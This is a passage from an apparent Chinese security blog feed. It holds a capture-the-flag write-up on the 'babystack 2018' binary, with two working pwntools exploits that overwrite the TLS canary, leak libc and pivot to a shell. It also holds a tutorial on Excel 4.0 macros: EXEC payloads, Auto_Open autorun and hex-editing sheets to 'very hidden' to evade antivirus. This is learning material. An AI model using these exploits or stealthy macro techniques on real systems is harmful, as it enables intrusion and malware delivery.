class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;asm/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">get_long</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">8</span>];</span><br><span class="line">    fgets(buf, <span class="number">8</span>, <span class="built_in">stdin</span>);</span><br><span class="line">    <span class="keyword">return</span> (<span class="type">size_t</span>)atol(buf);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">size_t</span> <span class="title function_">readn</span><span class="params">(<span class="type">int</span> fd, <span class="type">char</span> *buf, <span class="type">size_t</span> n)</span> &#123;</span><br><span class="line"><span class="type">size_t</span> rc;</span><br><span class="line"><span class="type">size_t</span> nread = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (nread &lt; n) &#123;</span><br><span class="line">rc = read(fd, &amp;buf[nread], n-nread);</span><br><span class="line"><span class="keyword">if</span> (rc == <span class="number">-1</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (errno == EAGAIN || errno == EINTR) &#123;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (rc == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">nread += rc;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> nread;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> * <span class="title function_">start</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">size_t</span> size;</span><br><span class="line">    <span class="type">char</span> input[<span class="number">0x1000</span>];</span><br><span class="line">    <span class="built_in">memset</span>(input, <span class="number">0</span>, <span class="number">0x1000</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Welcome to babystack 2018!&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;How many bytes do you want to send?&quot;</span>);</span><br><span class="line">    size = get_long();</span><br><span class="line">    <span class="keyword">if</span> (size &gt; <span class="number">0x10000</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;You are greedy!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    readn(<span class="number">0</span>, input, size);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;It&#x27;s time to say goodbye.&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="type">pthread_t</span> t;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot; #   #    ####    #####  ######&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;  # #    #    #     #    #&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;### ###  #          #    #####&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;  # #    #          #    #&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot; #   #   #    #     #    #&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;          ####      #    #&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    pthread_create(&amp;t, <span class="literal">NULL</span>, &amp;start, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (pthread_join(t, <span class="literal">NULL</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;exit failure&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Bye bye&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="大体思路"><a href="#大体思路" class="headerlink" title="大体思路"></a>大体思路</h5><ul><li>通过padding爆破填充a修改TLS中的canary为aaaaaaaa，从而绕过栈溢出保护（这里必须是线程的题目，而且输入足够大才行！）</li><li>泄露出puts的got地址得到真实的基地址，用于getshell</li><li>利用栈迁移，在bss段中开辟一个空间来写one_gadget来payload</li></ul><p>我们看多线程中的反汇编函数，可以看到参数s的大小是<strong>0x1010</strong>，而v2可以允许<strong>0x10000</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> *__fastcall <span class="title">start_routine</span><span class="params">(<span class="type">void</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-1018h]</span></span><br><span class="line">  <span class="type">char</span> s; <span class="comment">// [rsp+10h] [rbp-1010h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+1018h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x1000</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to babystack 2018!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;How many bytes do you want to send?&quot;</span>);</span><br><span class="line">  v2 = <span class="built_in">sub_400906</span>(<span class="string">&quot;How many bytes do you want to send?&quot;</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v2 &lt;= <span class="number">0x10000</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">sub_400957</span>(<span class="number">0LL</span>, &amp;s, v2);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;It&#x27;s time to say goodbye.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You are greedy!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后看sub_400906函数，结合上个函数的传参可以看到read函数有明显的溢出，但是有canary保护，而且是线程，所以我们这里学习一种新招式，TSL（线程局部存储）攻击，基本思路就是我们得覆盖很多个a到高地址，直到把TLS给覆盖从而修改了canary的值为a，绕过了canary后就可以栈溢出操作了。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">signed</span> __int64 __fastcall <span class="title">sub_400957</span><span class="params">(<span class="type">int</span> a1, __int64 a2, <span class="type">unsigned</span> __int64 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+8h] [rbp-28h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line">  <span class="type">ssize_t</span> v6; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = a3;</span><br><span class="line">  v5 = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">while</span> ( v5 &lt; v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = <span class="built_in">read</span>(a1, (<span class="type">void</span> *)(v5 + a2), v4 - v5);</span><br><span class="line">    <span class="keyword">if</span> ( v6 == <span class="number">-1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *_errno_location() != <span class="number">11</span> &amp;&amp; *_errno_location() != <span class="number">4</span> )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !v6 )</span><br><span class="line">        <span class="keyword">return</span> v5;</span><br><span class="line">      v5 += v6;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>查找值</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">ascotbe@ubuntu:~/Desktop/PWN$ ROPgadget --binary babystack --only <span class="string">&quot;pop|ret&quot;</span></span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x0000000000400bfc : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400bfe : pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400c00 : pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400c02 : pop r15 ; ret</span><br><span class="line">0x0000000000400bfb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400bff : pop rbp ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400870 : pop rbp ; ret</span><br><span class="line">0x0000000000400c03 : pop rdi ; ret</span><br><span class="line">0x0000000000400c01 : pop rsi ; pop r15 ; ret</span><br><span class="line">0x0000000000400bfd : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400791 : ret</span><br><span class="line">0x000000000040028b : ret 0x2800</span><br><span class="line">0x000000000040097e : ret 0x8b48</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 13</span><br></pre></td></tr></table></figure><p>主要就是覆盖TLS中的cancry值，然后加上ret2libc3题目的操作即可</p><div class="note warning modern"><p>下面两个POC都能跑，但是没搞懂如何计算出来的TLS长度为6218的。。。。</p></div><p>POC1</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> context.quiet:</span><br><span class="line">    p = process(<span class="string">&#x27;./babystack&#x27;</span>, env = &#123;<span class="string">&#x27;LD_PRELOAD&#x27;</span>: <span class="string">&#x27;./libc-2.23.so&#x27;</span>&#125;)</span><br><span class="line"></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;How many bytes do you want to send?\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">0x1010</span> + <span class="number">2008</span> + <span class="number">8</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># puts(atol@GOT) to leak a libc address</span></span><br><span class="line">    payload  = p64(<span class="number">0x400c03</span>) <span class="comment"># pop rdi; ret;</span></span><br><span class="line">    payload += p64(<span class="number">0x601ff0</span>) <span class="comment"># rdi &lt;= atol@GOT</span></span><br><span class="line">    payload += p64(<span class="number">0x4007c0</span>) <span class="comment"># jmp puts@PLT</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># read(0, 0x602030, SIZE) to write the final payload somewhere in .bss</span></span><br><span class="line">    <span class="comment"># luckily, there is a large value in rdx, so we don&#x27;t need to provide it here</span></span><br><span class="line">    payload += p64(<span class="number">0x400c03</span>) <span class="comment"># pop rdi; ret;</span></span><br><span class="line">    payload += p64(<span class="number">0</span>)        <span class="comment"># rdi &lt;= stdin</span></span><br><span class="line">    payload += p64(<span class="number">0x400c01</span>) <span class="comment"># pop rsi; pop r15; ret;</span></span><br><span class="line">    payload += p64(<span class="number">0x602030</span>) <span class="comment"># rsi &lt;= 0x602030 (somewhere in .bss)</span></span><br><span class="line">    payload += p64(<span class="number">0</span>)        <span class="comment"># r15 &lt;= garbage</span></span><br><span class="line">    payload += p64(<span class="number">0x4007e0</span>) <span class="comment"># jmp read@PLT</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># pivot rsp into somewhere in .bss</span></span><br><span class="line">    payload += p64(<span class="number">0x400bfd</span>) <span class="comment"># pop rsp; pop r13; pop r14; pop r15; ret</span></span><br><span class="line">    payload += p64(<span class="number">0x602030</span>) <span class="comment"># rsp &lt;= 0x602030 (somewhere in .bss)</span></span><br><span class="line"></span><br><span class="line">    p.send(</span><br><span class="line">        <span class="comment"># garbage to fill out the buffer up to canary</span></span><br><span class="line">        <span class="string">&#x27;a&#x27;</span> * (<span class="number">0x1010</span> - <span class="number">8</span>) + \</span><br><span class="line">        <span class="comment"># fake canary</span></span><br><span class="line">        <span class="string">&#x27;b&#x27;</span> * <span class="number">8</span> + \</span><br><span class="line">        <span class="comment"># saved rbp</span></span><br><span class="line">        <span class="string">&#x27;c&#x27;</span> * <span class="number">8</span> + \</span><br><span class="line">        <span class="comment"># return address + ROP chain</span></span><br><span class="line">        payload + \</span><br><span class="line">        <span class="comment"># garbage</span></span><br><span class="line">        <span class="string">&#x27;d&#x27;</span> * (<span class="number">2000</span> - <span class="built_in">len</span>(payload)) + \</span><br><span class="line">        <span class="comment"># replace thread&#x27;s stack guard with our fake canary</span></span><br><span class="line">        <span class="string">&#x27;b&#x27;</span> * <span class="number">8</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="comment"># here the content of atol@GOT is printed</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;It&#x27;s time to say goodbye.\n&quot;</span>)</span><br><span class="line">    libc_base = u64(p.recv(<span class="number">6</span>) + <span class="string">&#x27;\x00\x00&#x27;</span>) - <span class="number">0x36ea0</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;libc base: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x4526aexecve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span></span><br><span class="line"><span class="string">    constraints:</span></span><br><span class="line"><span class="string">        [rsp+0x30] == NULL</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    one_gadget = libc_base + <span class="number">0x4526a</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;one gadget: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(one_gadget))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># here we provide the final payload for exploitation</span></span><br><span class="line">    <span class="comment"># since rsp is pivoted, we provide the rest of data here</span></span><br><span class="line">    p.sendline(</span><br><span class="line">        <span class="comment"># pop r13; pop r14; pop r15; ret</span></span><br><span class="line">        <span class="comment"># writing garbage to r13, r14, and r15</span></span><br><span class="line">        p64(<span class="number">0</span>) * <span class="number">3</span> + \</span><br><span class="line">        <span class="comment"># after above ret, the shell will be executed</span></span><br><span class="line">        p64(one_gadget) + \</span><br><span class="line">        <span class="comment"># write enough zeros in order to satify [rsp+0x30] == NULL constraint</span></span><br><span class="line">        <span class="string">&#x27;\x00&#x27;</span> * <span class="number">0x40</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>POC2</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params"><span class="built_in">bytes</span>,data</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;How many bytes do you want to send?\n&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(<span class="built_in">bytes</span>))</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    io.send(data)</span><br><span class="line"></span><br><span class="line">puts_plt = <span class="number">0x4007C0</span></span><br><span class="line">read_plt = <span class="number">0x4007E0</span> </span><br><span class="line">leave_addr = <span class="number">0x400A9B</span></span><br><span class="line"></span><br><span class="line">pop_rdi_addr = <span class="number">0x400c03</span></span><br><span class="line">puts_got = <span class="number">0x601FB0</span></span><br><span class="line">pop_rbp_addr = <span class="number">0x400870</span></span><br><span class="line">pop_rsi_addr = <span class="number">0x400c01</span></span><br><span class="line"></span><br><span class="line">bss_addr = <span class="number">0x602030</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./bs&#x27;</span>,env = &#123;<span class="string">&quot;LD_PRELOAD&quot;</span> : <span class="string">&quot;./libc-2.23.so&quot;</span>&#125;)</span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">payload = <span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x1010</span>+p64(bss_addr-<span class="number">0x8</span>)+p64(pop_rdi_addr) + p64(puts_got) + p64(puts_plt)</span><br><span class="line">payload += p64(pop_rdi_addr) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rsi_addr) + p64(bss_addr) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(read_plt) + p64(leave_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x2000</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">menu(<span class="number">0x2000</span>,payload)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;It\&#x27;s time to say goodbye.\n&#x27;</span>)</span><br><span class="line">base = u64(io.recv(<span class="number">6</span>)+<span class="string">&#x27;\x00\x00&#x27;</span>)-libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">io.send(p64(base+<span class="number">0xf1147</span>))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">《ctf竞赛权威指南（PWN篇）》</span><br><span class="line">https://ctf-wiki.org/pwn/linux/mitigation/canary/</span><br><span class="line">https://www.jianshu.com/p/b0b254b94afe</span><br><span class="line">http://6par.top/2020/07/05/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</span><br><span class="line">http://www.int0x80.top/BypassCanary/</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
        
        
    <summary type="html"></summary>
        
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Office Excel Macro</title>
    <link href="https://www.ascotbe.com/2021/01/27/OfficeExcelMacro/"/>
    <id>https://www.ascotbe.com/2021/01/27/OfficeExcelMacro/</id>
    <published>2021-01-27T10:45:42.000Z</published>
    <updated>2022-01-11T07:53:39.000Z</updated>
    
    <content type="html"><![CDATA[<div class="note danger modern"><p>郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</p></div><blockquote><p>前言</p></blockquote><p>好久没笼统的学习了，梳理下Excel宏相关的东西以防下次要用的时候都不会。</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/OfficeExcelMacro/1.png" alt="image-20210128134158060"></p><h3 id="关于宏"><a href="#关于宏" class="headerlink" title="关于宏"></a>关于宏</h3><p>据我所知微软office所支持的宏里面，目前有两种</p><ul><li>1992年：微软在office中引用了名为Excel4.0的宏代码技术，也被成为XLM宏。Excel4.0宏代码写在表格中，宏代码的具体文件呈现为xml而不是二进制文件。</li><li>1993年：微软更新了Excel5.0技术，也就是现在常见的VBA宏代码。</li></ul><p>从Excel2010到Excel2019全线产品都支持Excel4.0宏。同时微软也提到，虽然目前Microsoft Excel仍然支持Excel4.0宏，但还是建议用户使用VBA宏。</p><h3 id="Macro-4-0"><a href="#Macro-4-0" class="headerlink" title="Macro 4.0"></a>Macro 4.0</h3><h4 id="简单利用"><a href="#简单利用" class="headerlink" title="简单利用"></a>简单利用</h4><p>在箭头位置点击右键-&gt;插入即可使用</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/OfficeExcelMacro/2.png" alt="image-20210126164024520"></p><p>接着会出现一个新建的宏表格，我们在表格中添加如下命令，即可完成一个简单的宏</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">=EXEC(&quot;calc.exe&quot;)</span><br><span class="line">=ALERT(&quot;hello ascotbe~&quot;)</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/OfficeExcelMacro/3.gif" alt="1"></p><h4 id="隐蔽性"><a href="#隐蔽性" class="headerlink" title="隐蔽性"></a>隐蔽性</h4><p>可以见到使用XLM宏比常见的VBA宏具有更好的免杀性，主要原因XLM宏和VBA宏的设计理念不同，导致了宏代码在文件结构中的呈现不同，和VBA宏一样的是，在文件打开时，Excel依旧会提醒用户</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Because of your security settings, macros have been disabled. To run macros, you need to reopen this workbook, and then choose to enable macros. For more information about enabling macros, click Help.</span><br></pre></td></tr></table></figure><p>不同的是，当用户单击启用之后，ALT + F11打开宏代码窗口，却并不能看到宏代码。也不能通过一些常见的宏代码提取工具检测分析宏。</p><p>这是因为默认情况下，XLM宏代码存储在<code>ascotbe.xlsm\xl\Macrosheets\Sheet1.xml</code>。打开该xml文件，可以清晰的看到刚才在Excel工作表中插入的宏代码。</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/OfficeExcelMacro/4.png" alt="image-20210126173824786"></p><h4 id="自动加载"><a href="#自动加载" class="headerlink" title="自动加载"></a>自动加载</h4><ul><li>Auto_Open：在用户打开文档的时候自动运行（如果用户允许执行宏代码）</li><li>Auto_Close：在用户关闭文档的时候自动运行（如果用户允许执行宏代码）</li></ul><p>XLM宏只需要将需要执行宏的单元格名称设置为Auto_Open或Auto_Close即可实现宏代码的自动加载。</p><h5 id="设置单元格名称"><a href="#设置单元格名称" class="headerlink" title="设置单元格名称"></a>设置单元格名称</h5><p>点击一个单元格，然后选着公式-&gt;定义的名称-&gt;定义名称即可设置成功</p><h5 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h5><p>没有设置Auto_Close关闭文档，可以看到无任何反应，当我们设置了以后关闭，弹出了计算器和弹窗</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/OfficeExcelMacro/5.gif" alt="2"></p><h4 id="隐藏方式"><a href="#隐藏方式" class="headerlink" title="隐藏方式"></a>隐藏方式</h4><h5 id="简单的隐藏"><a href="#简单的隐藏" class="headerlink" title="简单的隐藏"></a>简单的隐藏</h5><p>左下角隐藏，可以通过右键-&gt;取消隐藏来显示</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/OfficeExcelMacro/6.png" alt="image-20210127104310071"></p><p>列隐藏，可以看到正常都是从A1开始的表格，隐藏了列以后变成了从D1开始了，并且进度条是拉倒最左边的</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/OfficeExcelMacro/7.png" alt="image-20210127104449564"></p><h5 id="进制隐藏"><a href="#进制隐藏" class="headerlink" title="进制隐藏"></a>进制隐藏</h5><p>这种隐藏方式如果使用<code>xlsm</code>后缀格式的话是无法利用的，但是xls格式是可以的，通过全局搜索字符串<code>sheet1</code>找到后面十六进制是<strong>85 00</strong>开头的位置，然后往后数九个字节，可以看到框起来的最后一个字节是01</p><ul><li>00:表示不隐藏</li><li>01:表示浅隐藏（可通过鼠标右键取消隐藏）</li><li>02:表示深度隐藏（无法在Excel中找到）</li></ul><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/OfficeExcelMacro/8.png" alt="image-20210127181124488"></p><p>具体效果可以看图</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/OfficeExcelMacro/9.gif" alt="3"></p><h4 id="一个案例"><a href="#一个案例" class="headerlink" title="一个案例"></a>一个案例</h4><p>样本下载地址<a href="https://app.any.run/tasks/aaf8a9aa-5068-42dd-89cf-cd610ce5e730/">点我</a>，备份地址<a href="https://raw.staticdn.net/Ascotbe/Image/master/OfficeExcelMacro/Info_695.xls.zip">下载</a>，下面是样本的截图</p><p><img src= 